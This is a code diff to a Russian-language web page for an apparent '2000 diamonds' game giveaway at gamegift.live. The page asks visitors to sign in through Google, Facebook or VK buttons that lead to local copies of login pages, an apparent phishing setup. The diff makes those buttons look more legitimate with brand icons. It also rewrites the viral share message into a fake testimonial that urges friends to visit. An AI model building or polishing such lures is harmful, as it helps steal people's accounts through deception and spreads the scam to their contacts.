@@ -124,6 +124,32 @@
       background-color: #4CAF50;
     }
 
+    /* Стиль для кнопок входа с изображениями */
+    .login-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-top: 20px;
+    }
+
+    .login-button {
+      background-color: transparent;
+      border: none;
+      padding: 10px;
+      cursor: pointer;
+      transition: transform 0.3s ease;
+    }
+
+    .login-button img {
+      width: 50px;
+      height: 50px;
+      border-radius: 5px;
+    }
+
+    .login-button:hover {
+      transform: scale(1.1);
+    }
+
     @media (max-width: 768px) {
       .task-button {
         width: 100%;
@@ -161,9 +187,18 @@
     <div class="info-section hidden" id="reward-section">
       <h2>Поздравляем! Вы забрали свои 2000 алмазов.</h2>
       <p>Теперь войдите в свой аккаунт для получения награды. Выберите способ входа:</p>
-      <button class="task-button" onclick="window.location.href='login.google.html'">Войти через Google</button>
-      <button class="task-button" onclick="window.location.href='login.facebook.html'">Войти через Facebook</button>
-      <button class="task-button" onclick="window.location.href='login.vk.html'">Войти через VK</button>
+
+      <div class="login-buttons">
+        <button class="login-button" onclick="window.location.href='login.google.html'">
+          <img src="google-icon.png" alt="Google">
+        </button>
+        <button class="login-button" onclick="window.location.href='login.facebook.html'">
+          <img src="facebook-icon.png" alt="Facebook">
+        </button>
+        <button class="login-button" onclick="window.location.href='login.vk.html'">
+          <img src="vk-icon.png" alt="VK">
+        </button>
+      </div>
     </div>
 
     <div class="footer">
@@ -232,7 +267,7 @@
 
     // Функция для отправки сообщения в выбранный мессенджер
     function shareMessage(platform) {
-      const message = "Привет! Заходи и выполняй задания, забери свои 2000 алмазов здесь: https://gamegift.live/";
+      const message = "Привет! Это сайт дает 2000 алмазов каждому заходи я уже получил... Заходи и выполняй задания, забери свои 2000 алмазов здесь: https://gamegift.live/";
 
       let url;
       if (platform === 'whatsapp') {
